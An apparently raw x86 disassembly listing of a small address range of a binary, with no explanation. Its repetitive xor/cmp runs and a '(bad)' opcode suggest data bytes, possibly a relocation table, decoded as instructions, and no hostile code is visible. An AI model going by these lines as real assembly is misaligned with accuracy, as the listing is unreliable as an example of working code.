  425a39:	xor    edx,eax
  425a3b:	xor    edx,ebx
  425a3d:	xor    edx,edi
  425a3f:	xor    esp,ebp
  425a41:	xor    esi,edi
  425a43:	xor    eax,DWORD PTR [ebx]
  425a45:	xor    al,0x7
  425a47:	xor    al,0x10
  425a49:	xor    al,0x1a
  425a4b:	xor    al,0x27
  425a4d:	xor    al,0x33
  425a4f:	xor    al,0x38
  425a51:	xor    al,0x3e
  425a53:	xor    al,0x43
  425a55:	xor    al,0x49
  425a57:	xor    al,0xb6
  425a59:	xor    eax,0x35d135be
  425a5e:	xlat   BYTE PTR ds:[ebx]
  425a5f:	xor    eax,0x386d3727
  425a64:	jno    0x425a9e
  425a66:	jle    0x425aa0
  425a68:	mov    bh,BYTE PTR [eax]
  425a6a:	xchg   ecx,eax
  425a6b:	cmp    BYTE PTR [edi-0x53c759c8],dl
  425a71:	cmp    BYTE PTR [edx-0x54c489c8],dh
  425a77:	cmp    al,0xb3
  425a79:	cmp    al,0xb9
  425a7b:	cmp    al,0xbd
  425a7d:	cmp    al,0xcf
  425a7f:	cmp    al,0xdf
  425a81:	cmp    al,0xea
  425a83:	cmp    al,0xee
  425a85:	cmp    al,0xf5
  425a87:	cmp    al,0xfc
  425a89:	cmp    al,0x6
  425a8b:	cmp    eax,0x3d2d3d13
  425a90:	xor    edi,DWORD PTR ds:0x3d493d42
  425a96:	dec    edi
  425a97:	cmp    eax,0x3d613d56
  425a9c:	lahf   
  425a9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425a9f:	ds loope 0x425ae1
  425aa2:	jmp    0x425ae3
  425aa4:	clc    
  425aa5:	aas    
  425aa6:	add    BYTE PTR [eax+0x0],ah
  425aa9:	add    BYTE PTR [eax+0x0],bh
  425aac:	add    BYTE PTR [eax],al
  425aae:	add    al,0x30
  425ab0:	or     dh,BYTE PTR [eax]
  425ab2:	adc    dh,BYTE PTR [eax]
  425ab4:	sbb    BYTE PTR [eax],dh
  425ab6:	xor    DWORD PTR [eax],esi
  425ab8:	inc    edx
  425ab9:	xor    BYTE PTR [edi+0x30],cl
  425abc:	pusha  
  425abd:	xor    BYTE PTR [esi+0x30],ah
  425ac0:	ins    BYTE PTR es:[edi],dx
  425ac1:	xor    BYTE PTR [ecx+0x30],bh
  425ac4:	mov    dh,BYTE PTR [eax]
  425ac6:	lahf   
  425ac7:	xor    BYTE PTR [edx-0x32cf41d0],dh
  425acd:	xor    dl,ah
  425acf:	xor    bh,ch
  425ad1:	xor    ah,bh
  425ad3:	xor    BYTE PTR [edi],al
  425ad5:	xor    DWORD PTR [ebx],ecx
  425ad7:	xor    DWORD PTR [ebx],edx
  425ad9:	xor    DWORD PTR [edi],edx
  425adb:	xor    DWORD PTR [ebx],esp
  425add:	xor    DWORD PTR [edi],ebp
  425adf:	xor    DWORD PTR [ebx],esi
  425ae1:	xor    DWORD PTR [edx],edi
  425ae3:	xor    DWORD PTR [ebx+0x31],eax
  425ae6:	dec    ecx
  425ae7:	xor    DWORD PTR [edi+0x31],ecx
  425aea:	pusha  
  425aeb:	xor    DWORD PTR [ecx+esi*1+0x72],ebp
  425aef:	xor    DWORD PTR [ecx-0x72ce78cf],eax
  425af5:	xor    DWORD PTR [ebx-0x55ce5ecf],ebx
  425afb:	xor    DWORD PTR [ecx+esi*1+0x32ee31b8],esi
  425b02:	repnz xor bh,cl
  425b05:	xor    bh,ch
  425b07:	xor    al,BYTE PTR [esi]
  425b09:	xor    ecx,DWORD PTR [edx]
  425b0b:	xor    edi,DWORD PTR [eax+0x35]
  425b0e:	jl     0x425b45
  425b10:	dec    edx
  425b11:	cmp    eax,0x3e883d54
  425b16:	nop
  425b17:	ds cwde 
  425b19:	fstp   TBYTE PTR ds:[edi]
  425b1c:	add    BYTE PTR [eax],al
  425b1e:	add    BYTE PTR [eax+0x0],dh
  425b21:	add    BYTE PTR [eax+eax*1+0x0],ch
  425b25:	add    BYTE PTR ds:0x7d327331,ch
  425b2b:	xor    al,BYTE PTR [edx+esi*1+0x3296328a]
  425b32:	pushf  
  425b33:	xor    ah,BYTE PTR [edx-0x42cd50ce]
  425b39:	xor    cl,dl
  425b3b:	xor    al,BYTE PTR [ebp+esi*1+0x5d]
  425b3f:	xor    eax,0x3589356a
  425b44:	xchg   ebp,eax
  425b45:	xor    eax,0x35a2359c
  425b4a:	scas   al,BYTE PTR es:[edi]
  425b4b:	xor    eax,0x35ba35b4
  425b50:	int3   
  425b51:	xor    eax,0x370f35d0
  425b56:	sbb    esi,DWORD PTR [edi]
  425b58:	daa    
  425b59:	aaa    
  425b5a:	sub    esi,DWORD PTR [edi]
  425b5c:	xor    esi,DWORD PTR [edi]
  425b5e:	jbe    0x425b98
  425b60:	xchg   BYTE PTR [eax],bh
  425b62:	cwde   
  425b63:	cmp    BYTE PTR [esi-0x4ac754c8],bl
  425b69:	cmp    BYTE PTR [eax+edi*1+0x38d638c2],bh
  425b70:	in     al,dx
  425b71:	cmp    dl,dh
  425b73:	cmp    BYTE PTR [edi],al
  425b75:	cmp    DWORD PTR [ecx+edi*1],ecx
  425b78:	push   ecx
  425b79:	cmp    bl,BYTE PTR [ebx+0x3a]
  425b7c:	push   0x813a7b3a
  425b81:	cmp    cl,BYTE PTR [esi-0x62c56ac6]
  425b87:	cmp    ah,BYTE PTR [edx+edi*1+0x8000]
  425b8e:	sbb    BYTE PTR [edx],al
  425b90:	add    BYTE PTR [eax],al
  425b92:	mov    dh,0x30
  425b94:	mov    esp,0xcb30c230
  425b99:	xor    dl,dl
  425b9b:	xor    ah,ch
  425b9d:	xor    al,bh
  425b9f:	xor    BYTE PTR [edx],al
  425ba1:	xor    DWORD PTR [ecx],ecx
  425ba3:	xor    DWORD PTR [edi],ecx
  425ba5:	xor    DWORD PTR [ebx],ebx
  425ba7:	xor    DWORD PTR [ecx],esp
  425ba9:	xor    DWORD PTR [edi],esp
  425bab:	xor    esp,ebp
  425bad:	xor    esi,edi
  425baf:	xor    DWORD PTR [eax],ecx
  425bb1:	xor    dl,BYTE PTR ds:0x2b322532
  425bb7:	xor    bh,BYTE PTR [eax]
  425bb9:	xor    bh,BYTE PTR [edi]
  425bbb:	xor    al,BYTE PTR [ebp+0x32]
  425bbe:	dec    esp
  425bbf:	xor    bl,BYTE PTR [esi+0x33]
  425bc2:	xor    ebp,DWORD PTR fs:[esi+0x33]
  425bc6:	je     0x425bfb
  425bc8:	js     0x425bfd
  425bca:	xor    BYTE PTR [ebx],0x90
  425bcd:	xor    edx,DWORD PTR [ebx+esi*1+0x33a533a1]
  425bd4:	lods   al,BYTE PTR ds:[esi]
  425bd5:	xor    edi,DWORD PTR [ebx-0x37cc3dcd]
  425bdb:	xor    edx,ebp
  425bdd:	xor    esp,edi
  425bdf:	xor    ebp,ebp
  425be1:	xor    edi,edx
  425be3:	xor    eax,DWORD PTR [ecx]
  425be5:	xor    al,0xc
  425be7:	xor    al,0x1b
  425be9:	xor    al,0x25
  425beb:	xor    al,0x2a
  425bed:	xor    al,0x30
  425bef:	xor    al,0x36
  425bf1:	xor    al,0x48
  425bf3:	xor    al,0x57
  425bf5:	xor    al,0x66
  425bf7:	xor    al,0x75
  425bf9:	xor    al,0x84
  425bfb:	xor    al,0x88
  425bfd:	xor    al,0x98
  425bff:	xor    al,0xc7
  425c01:	xor    al,0xd0
  425c03:	xor    al,0xdc
  425c05:	xor    al,0xe6
  425c07:	xor    al,0xf3
  425c09:	xor    al,0x5
  425c0b:	xor    eax,0x3517350b
  425c10:	sbb    eax,0x2b352535
  425c15:	xor    eax,0x353b3536
  425c1a:	inc    ecx
  425c1b:	xor    eax,0x35573550
  425c20:	pop    ebp
  425c21:	xor    eax,0x3586356a
  425c26:	xchg   edx,eax
  425c27:	xor    eax,0x359e3598
  425c2c:	scas   al,BYTE PTR es:[edi]
  425c2d:	xor    eax,0x35c735bb
  425c32:	into   
  425c33:	xor    eax,0x35e735d4
  425c38:	in     eax,dx
  425c39:	xor    eax,0x360035f3
  425c3e:	or     al,0x36
  425c40:	adc    esi,DWORD PTR [esi]
  425c42:	sbb    DWORD PTR [esi],esi
  425c44:	sub    esi,DWORD PTR [esi]
  425c46:	xor    DWORD PTR [esi],esi
  425c48:	ds ss inc ebp
  425c4b:	ss dec ebx
  425c4d:	ss pop eax
  425c4f:	ss fs ss push 0x36
  425c54:	jo     0x425c8c
  425c56:	jnp    0x425c8e
  425c58:	xchg   DWORD PTR [esi],esi
  425c5a:	mov    esi,DWORD PTR [esi]
  425c5c:	xchg   edx,eax
  425c5d:	ss pushf 
  425c5f:	ss test eax,0xcb36c536
  425c65:	fdiv   DWORD PTR ss:[esi]
  425c68:	fbstp  TBYTE PTR [esi]
  425c6a:	in     eax,0x36
  425c6c:	in     al,dx
  425c6d:	div    DWORD PTR ss:[esi]
  425c70:	add    DWORD PTR [edi],esi
  425c72:	or     BYTE PTR [edi],dh
  425c74:	push   cs
  425c75:	aaa    
  425c76:	and    eax,0x38372b37
  425c7b:	aaa    
  425c7c:	aas    
  425c7d:	aaa    
  425c7e:	inc    ebp
  425c7f:	aaa    
  425c80:	push   edi
  425c81:	aaa    
  425c82:	pop    ebx
  425c83:	aaa    
  425c84:	data16 aaa 
  425c86:	imul   esi,DWORD PTR [edi],0x76
  425c89:	aaa    
  425c8a:	xor    DWORD PTR [edi],0xffffffa7
  425c8d:	aaa    
  425c8e:	mov    cl,0x37
  425c90:	mov    ebx,0xc837c237
  425c95:	aaa    
  425c96:	aam    0x37
  425c98:	out    0x37,eax
  425c9a:	in     eax,dx
  425c9b:	aaa    
  425c9c:	stc    
  425c9d:	aaa    
  425c9e:	or     BYTE PTR [eax],bh
  425ca0:	push   cs
  425ca1:	cmp    BYTE PTR [eax+edi*1],dl
  425ca4:	sbb    DWORD PTR [eax],edi
  425ca6:	and    bh,BYTE PTR [eax]
  425ca8:	sub    al,0x38
  425caa:	xor    bh,BYTE PTR [eax]
  425cac:	cmp    BYTE PTR ss:[esi],bh
  425caf:	cmp    BYTE PTR [edx+0x38],cl
  425cb2:	data16 cmp BYTE PTR [eax+edi*1+0x7c],ch
  425cb7:	cmp    BYTE PTR [edx-0x6cc773c8],al
  425cbd:	cmp    BYTE PTR [ecx-0x48c74ec8],bl
  425cc3:	cmp    ah,al
  425cc5:	cmp    dh,cl
  425cc7:	cmp    bl,bl
  425cc9:	cmp    bl,ch
  425ccb:	cmp    cl,dh
  425ccd:	cmp    BYTE PTR [eax],al
  425ccf:	cmp    DWORD PTR [edi],eax
  425cd1:	cmp    DWORD PTR ds:0x1f391439,ecx
  425cd7:	cmp    DWORD PTR [eax],esi
  425cd9:	cmp    DWORD PTR [edi],esi
  425cdb:	cmp    DWORD PTR ds:0x5a394a39,edi
  425ce1:	cmp    DWORD PTR [eax+0x39],esp
  425ce4:	outs   dx,DWORD PTR ds:[esi]
  425ce5:	cmp    DWORD PTR [esi+0x39],esi
  425ce8:	cmp    DWORD PTR [ecx],0x39ab3990
  425cee:	mov    bl,0x39
  425cf0:	sar    BYTE PTR [ecx],0xd1
  425cf3:	cmp    edi,edx
  425cf5:	cmp    ebp,ebx
  425cf7:	cmp    edx,ebp
  425cf9:	cmp    DWORD PTR [ecx],ecx
  425cfb:	cmp    cl,BYTE PTR [edi]
  425cfd:	cmp    bl,BYTE PTR [ebx]
  425cff:	cmp    ah,BYTE PTR [ecx]
  425d01:	cmp    ch,BYTE PTR [ebx]
  425d03:	cmp    dh,BYTE PTR [ecx]
  425d05:	cmp    al,BYTE PTR [ebx+0x3a]
  425d08:	dec    ebx
  425d09:	cmp    dl,BYTE PTR [ebp+0x3a]
  425d0c:	bound  edi,QWORD PTR [edx]
  425d0e:	jle    0x425d4a
  425d10:	test   BYTE PTR [edx],bh
  425d12:	xchg   ebx,eax
  425d13:	cmp    bl,BYTE PTR [edx-0x56c55dc6]
  425d19:	cmp    dh,BYTE PTR [edx+edi*1+0x3aca3ac3]
  425d20:	sar    BYTE PTR [edx],1
  425d22:	fnstsw WORD PTR [edx]
  425d24:	out    dx,eax
  425d25:	cmp    bh,bl
  425d27:	cmp    al,BYTE PTR [ecx]
  425d29:	cmp    ecx,DWORD PTR [ecx]
  425d2b:	cmp    edi,DWORD PTR [ebx]
  425d2d:	cmp    eax,DWORD PTR [ebp+0x3b]
  425d30:	dec    esp
  425d31:	cmp    edx,DWORD PTR [edx+0x3b]
  425d34:	pop    esi
  425d35:	cmp    esp,DWORD PTR [ebx+edi*1+0x6a]
  425d39:	cmp    esi,DWORD PTR [edi+0x3b]
  425d3c:	jle    0x425d79
  425d3e:	test   BYTE PTR [ebx],bh
  425d40:	xchg   ecx,eax
  425d41:	cmp    ebx,DWORD PTR [ecx-0x4ac45dc5]
  425d47:	cmp    edi,DWORD PTR [ebp-0x26c435c5]
  425d4d:	cmp    ebx,edi
  425d4f:	cmp    ebp,edi
  425d51:	cmp    edi,ecx
  425d53:	cmp    eax,DWORD PTR [eax]
  425d55:	cmp    al,0x6
  425d57:	cmp    al,0x21
  425d59:	cmp    al,0x2c
  425d5b:	cmp    al,0x32
  425d5d:	cmp    al,0x38
  425d5f:	cmp    al,0x45
  425d61:	cmp    al,0x4c
  425d63:	cmp    al,0x52
  425d65:	cmp    al,0x69
  425d67:	cmp    al,0x75
  425d69:	cmp    al,0x86
  425d6b:	cmp    al,0x8c
  425d6d:	cmp    al,0x91
  425d6f:	cmp    al,0x9d
  425d71:	cmp    al,0xa1
  425d73:	cmp    al,0xa9
  425d75:	cmp    al,0xad
  425d77:	cmp    al,0xb5
  425d79:	cmp    al,0xcb
  425d7b:	cmp    al,0xd8
  425d7d:	cmp    al,0xe0
  425d7f:	cmp    al,0xed
  425d81:	cmp    al,0xf3
  425d83:	cmp    al,0x2
  425d85:	cmp    eax,0x3d153d0a
  425d8a:	sbb    DWORD PTR ds:0x3d2d3d23,edi
  425d90:	cmp    bh,BYTE PTR ds:0x3d653d5f
  425d96:	jno    0x425dd5
  425d98:	ja     0x425dd7
  425d9a:	jg     0x425dd9
  425d9c:	test   DWORD PTR ds:0x3d8f,edi
  425da2:	add    BYTE PTR [eax+0xb00000],dl
  425da8:	add    BYTE PTR [eax],al
  425daa:	cmp    al,0x30
  425dac:	xchg   ecx,eax
  425dad:	xor    al,dl
  425daf:	xor    al,bl
  425db1:	xor    ch,bl
  425db3:	xor    BYTE PTR [ebx],cl
  425db5:	xor    DWORD PTR [ecx+esi*1],ebx
  425db8:	xor    DWORD PTR es:[esi],ebp
  425dbb:	xor    DWORD PTR [esi],edi
  425dbd:	xor    DWORD PTR [ecx+0x31],ebp
  425dc0:	jne    0x425df3
  425dc2:	nop
  425dc3:	xor    DWORD PTR [edx+0x2931b531],ebx
  425dc9:	xor    ch,BYTE PTR [esi]
  425dcb:	xor    dh,BYTE PTR [edi+0x32]
  425dce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425dcf:	xor    dh,BYTE PTR [eax-0x41cd4bce]
  425dd5:	xor    cl,al
  425dd7:	xor    cl,bh
  425dd9:	xor    dl,ch
  425ddb:	xor    ah,ah
  425ddd:	xor    ch,bh
  425ddf:	xor    dh,ch
  425de1:	xor    al,BYTE PTR [edx]
  425de3:	xor    ecx,DWORD PTR [ecx]
  425de5:	xor    ecx,DWORD PTR [edi]
  425de7:	xor    ebx,DWORD PTR [ecx-0x4bcb59cc]
  425ded:	xor    al,0xc0
  425def:	xor    al,0xe1
  425df1:	xor    al,0xeb
  425df3:	xor    al,0xf2
  425df5:	xor    al,0xf8
  425df7:	xor    al,0x7
  425df9:	xor    eax,0x3511350c
  425dfe:	pop    ss
  425dff:	xor    eax,0x352a351d
  425e04:	ss xor eax,0x354c3545
  425e0a:	push   edx
  425e0b:	xor    eax,0x356b355f
  425e10:	jl     0x425e47
  425e12:	xchg   ebp,eax
  425e13:	xor    eax,0x35b135a2
  425e18:	(bad)  
  425e19:	xor    eax,0x35d835d4
  425e1e:	cmp    BYTE PTR [edi],dh
  425e20:	inc    esp
  425e21:	aaa    
  425e22:	push   esp
  425e23:	aaa    
  425e24:	pop    edi
  425e25:	aaa    
  425e26:	push   0x74376e37
  425e2b:	aaa    
  425e2c:	xor    DWORD PTR [edi],0x37933787
  425e32:	cdq    
  425e33:	aaa    
  425e34:	lahf   
  425e35:	aaa    
  425e36:	xor    bh,BYTE PTR [ebx]
  425e38:	test   al,0x3c
  425e3a:	lods   al,BYTE PTR ds:[esi]
  425e3b:	cmp    al,0x23
  425e3d:	xor    edi,DWORD PTR ds:[esi]
  425e40:	aas    
  425e41:	ds dec esp
  425e43:	ds push esp
  425e45:	ds fs outs dx,BYTE PTR ds:[esi]
  425e49:	ds jnp 0x425e8a
  425e4c:	sahf   
  425e4d:	mov    ds:0x3ea93e,eax
  425e53:	rol    BYTE PTR [eax],1
  425e55:	add    BYTE PTR [eax],bl
  425e57:	add    BYTE PTR [eax],al
  425e59:	add    BYTE PTR [edi],bl
  425e5b:	cmp    ah,BYTE PTR [ebx]
  425e5d:	cmp    ah,BYTE PTR [edi]
  425e5f:	cmp    ch,BYTE PTR [ebx]
  425e61:	cmp    ch,BYTE PTR [edi]
  425e63:	cmp    dh,BYTE PTR [ebx]
  425e65:	cmp    dh,BYTE PTR [edi]
  425e67:	cmp    bh,BYTE PTR [ebx]
  425e69:	cmp    al,BYTE PTR [eax]
  425e6b:	adc    BYTE PTR [edx],al
  425e6d:	add    BYTE PTR [eax],bl
  425e6f:	add    BYTE PTR [eax],al
  425e71:	add    BYTE PTR [esi-0x59c55dc6],bl
  425e77:	cmp    ch,BYTE PTR [edx-0x4dc551c6]
  425e7d:	cmp    dh,BYTE PTR [esi+0x3aba3a]
  425e83:	push   eax
  425e84:	add    al,0x0
  425e86:	push   0x18000000
  425e8b:	xor    BYTE PTR [eax+esi*1],bl
  425e8e:	and    BYTE PTR [eax],dh
  425e90:	mov    al,ds:0xa831a431
  425e95:	xor    DWORD PTR [ecx+esi*1+0x31b431b0],ebp
  425e9c:	mov    eax,0xc031bc31
  425ea1:	xor    esp,eax
  425ea3:	xor    eax,edx
  425ea5:	xor    esp,edx
  425ea7:	xor    eax,ebx
  425ea9:	xor    esp,ebx
  425eab:	xor    eax,esp
  425ead:	xor    esp,esp
  425eaf:	xor    eax,ebp
  425eb1:	xor    esp,ebp
  425eb3:	xor    eax,esi
  425eb5:	xor    esp,esi
  425eb7:	xor    DWORD PTR [eax],eax
  425eb9:	xor    cl,BYTE PTR [edx+esi*1]
  425ebc:	adc    al,0x32
  425ebe:	sub    BYTE PTR [edx],dh
  425ec0:	pop    esp
  425ec1:	xor    ah,BYTE PTR [eax+0x32]
  425ec4:	je     0x425ef8
  425ec6:	lods   al,BYTE PTR ds:[esi]
  425ec7:	xor    cl,BYTE PTR [eax+0x33]
  425eca:	sbb    BYTE PTR [eax+eiz*1],dh
  425ecd:	xor    al,0x28
  425ecf:	xor    al,0x2c
  425ed1:	xor    al,0xd4
  425ed3:	xor    al,0xd8
  425ed5:	xor    al,0xdc
  425ed7:	xor    al,0xe0
  425ed9:	xor    al,0xe4
  425edb:	xor    al,0xe8
  425edd:	xor    al,0xec
  425edf:	xor    al,0xf0
  425ee1:	xor    al,0xf4
  425ee3:	xor    al,0xf8
  425ee5:	xor    al,0xfc
  425ee7:	xor    al,0x0
  425ee9:	add    BYTE PTR [eax],al
  425eeb:	add    BYTE PTR [eax+eax*1],0x18
  425eef:	add    BYTE PTR [eax],al
  425ef1:	add    BYTE PTR [ecx+edi*1+0x39b439b0],ch
  425ef8:	mov    eax,0xc039bc39
  425efd:	cmp    esp,eax
  425eff:	cmp    eax,ecx
  425f01:	cmp    DWORD PTR [eax],eax
  425f03:	mov    al,0x4
  425f05:	add    BYTE PTR [eax],bl
  425f07:	add    BYTE PTR [eax],al
  425f09:	add    ah,ch
  425f0b:	ss lock ss hlt 
  425f0f:	ss clc 
  425f11:	ss cld 
  425f13:	add    BYTE PTR ss:[edi],dh
  425f16:	add    al,0x37
  425f18:	or     BYTE PTR [edi],dh
	...
